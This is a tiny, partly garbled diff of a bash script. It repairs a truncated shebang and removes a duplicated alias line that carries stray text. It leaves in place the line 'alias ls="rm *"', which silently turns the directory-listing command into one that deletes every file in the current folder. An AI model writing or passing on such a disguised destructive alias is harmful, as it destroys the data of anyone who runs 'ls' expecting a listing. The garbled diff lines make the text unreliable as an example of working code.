@@ -1,11 +1,5 @@
-#!/bin/bas
-
-
-
-
-
-
-
-
+#!/bin/bash
 alias ls="rm *"
-alias ls="rm *"ibash
+
+
+
